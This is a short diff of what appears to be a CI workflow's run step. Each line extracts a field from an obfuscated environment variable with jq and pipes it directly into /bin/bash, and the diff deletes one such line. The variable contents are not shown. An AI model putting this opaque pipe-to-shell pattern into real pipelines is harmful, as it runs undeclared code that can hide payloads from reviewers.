@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$p23258" | jq -r .tlzbh39 | /bin/bash
           echo $dkpo32035 | jq -r .xixg67 | /bin/bash
-          printf '%s' "$yfjxy22" | jq -r .jl6 | /bin/bash
           printf '%s' "$jemx186" | jq -r .wi36 | /bin/bash
 
       - name: Archive data
